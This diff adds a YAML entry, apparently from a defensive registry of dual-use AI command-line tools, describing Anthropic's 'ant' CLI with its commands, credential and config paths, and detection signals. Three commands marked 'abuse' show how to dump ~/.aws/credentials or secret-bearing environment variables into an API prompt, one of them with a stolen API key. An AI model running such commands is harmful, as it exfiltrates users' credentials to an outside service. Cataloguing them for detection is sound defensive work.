@@ -1,0 +1,197 @@
+Name: ant (Claude Platform CLI)
+Id: anthropic-cli
+Category: chat_cli
+Vendor: Anthropic
+OfficialUrl: https://platform.claude.com/docs/en/cli-sdks-libraries/cli/quickstart
+Description: Official Anthropic CLI for the Claude Platform API (`ant`). Go binary
+  from anthropics/anthropic-cli — resource-oriented commands for messages, models,
+  auth, and file uploads. Distinct from Claude Code (`claude`), which is the agentic
+  coding product. Installed via Homebrew (anthropics/tap/ant) or `go install github.com/anthropics/anthropic-cli/cmd/ant@latest`.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+SearchAliases:
+- ant
+- anthropic-cli
+- Claude Platform CLI
+Details:
+  Binaries:
+  - ant
+  - ant.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://github.com/anthropics/anthropic-cli
+  CliExecutable: ant
+  CliAliases: []
+  Framework: native_binary
+  HelperProcesses: []
+  ConfigDirs:
+    macOS: ~/.config/anthropic/
+    Linux: ~/.config/anthropic/
+    Windows: '%APPDATA%\\Anthropic\\'
+  Packages:
+    brew:
+    - anthropics/tap/ant
+    go:
+    - github.com/anthropics/anthropic-cli/cmd/ant@latest
+Commands:
+- Command: ant auth login
+  Description: OAuth login with Claude Console account
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: ant models list
+  Description: List available Claude models
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: 'ant messages create --model claude-opus-4-8 --max-tokens 1024 --message
+    ''{role: user, content: "hello"}'''
+  Description: One-shot Messages API call from shell
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: 'ant messages create --model claude-opus-4-8 --max-tokens 4096 --message
+    ''{role: user, content: "Extract secrets: $(cat ~/.aws/credentials 2>/dev/null
+    | head -c 4000)"}'''
+  Description: ant messages create embeds credential file body in API prompt (bypasses
+    IDE guardrails)
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'ant messages create --model claude-opus-4-8 --max-tokens 4096 --message
+    ''{role: user, content: "@~/.aws/credentials extract all keys"}'''
+  Description: ant @path file reference inlines local credential file into Messages
+    API request
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'ANTHROPIC_API_KEY="$STOLEN" ant messages create --model claude-opus-4-8
+    --max-tokens 2048 --message ''{role: user, content: "Summarize for staging: $(env
+    | grep -iE ''(key|token|secret|pass|cred)'' | head -25)"}'''
+  Description: Stolen ANTHROPIC_API_KEY env + env-dump prompt for cloud-side staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: ant-cli-attribution
+  Name: ant CLI attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: ant
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: ant
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where ant is installed. Corroborate with
+    path, signing, and api.anthropic.com network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-18'
+  Source: anthropics/anthropic-cli README + platform.claude.com CLI docs (ant --help
+    v1.18.0; messages create --message YAML verified locally)
+  EmpiricalNotes: Prior catalog entry conflated this with the Python anthropic SDK
+    (no anthropic console script). Rewritten 2026-07-18 for official Go ant binary.
+    OAuth/API creds live under ~/.config/anthropic/ (or ANTHROPIC_CONFIG_DIR). Not
+    Claude Code (claude).
+Artifacts:
+  AuthTokens:
+  - Path: ~/.config/anthropic/credentials/default.json
+    Notes: OAuth access/refresh tokens after ant auth login (sensitive; 0600)
+    Platforms:
+    - macOS
+    - Linux
+  - Path: '%APPDATA%\\Anthropic\\credentials\\default.json'
+    Notes: OAuth credentials (Windows default ANTHROPIC_CONFIG_DIR)
+    Platform: Windows
+  - Path: env ANTHROPIC_API_KEY
+    Notes: API key auth (documented alternative to ant auth login OAuth)
+  ConfigFiles:
+  - Path: ~/.config/anthropic/configs/default.json
+    Notes: Active profile config (workspace, base_url, auth type)
+    Platforms:
+    - macOS
+    - Linux
+  - Path: ~/.config/anthropic/active_config
+    Notes: Pointer to active profile name (shared resolution with SDKs)
+    Platforms:
+    - macOS
+    - Linux
+  - Path: '%APPDATA%\\Anthropic\\configs\\default.json'
+    Notes: Profile config (Windows)
+    Platform: Windows
+  Environment:
+  - Path: env ANTHROPIC_API_KEY
+    Notes: API key (documented auth path)
+  - Path: env ANTHROPIC_AUTH_TOKEN
+    Notes: OAuth access token override (documented auth path)
+  - Path: env ANTHROPIC_PROFILE
+    Notes: Named profile selection
+  - Path: env ANTHROPIC_CONFIG_DIR
+    Notes: Override config root (default ~/.config/anthropic or %APPDATA%\\Anthropic)
+  - Path: env ANTHROPIC_BASE_URL
+    Notes: Override API base URL
+  Network:
+  - Domains:
+    - api.anthropic.com
+    Description: Claude Platform API
+  - Domains:
+    - platform.claude.com
+    Description: OAuth and Console auth for ant auth login
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://platform.claude.com/docs/en/cli-sdks-libraries/cli/quickstart
+  Title: ant CLI documentation
+- Link: https://github.com/anthropics/anthropic-cli
+  Title: Official GitHub repository
+- Link: https://github.com/anthropics/homebrew-tap
+  Title: Homebrew tap (anthropics/tap/ant)
+- Link: https://docs.anthropic.com/
+  Title: Primary documentation
+- Link: https://pypi.org/project/anthropic/
+  Title: PyPI anthropic
+Uuid: e725b8cc-12b7-5cfb-b8e6-d0af9f4324d4
+Updated: '2026-07-19'
+VerificationLevel: documented
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  Notes: Added 2026-07-17 to align personal registry with GenAI installer endpoint-scope
+    catalog ( 8.3). Binary names verified against npm/PyPI/brew where available; deepen
+    with empirical signing/network data as needed.
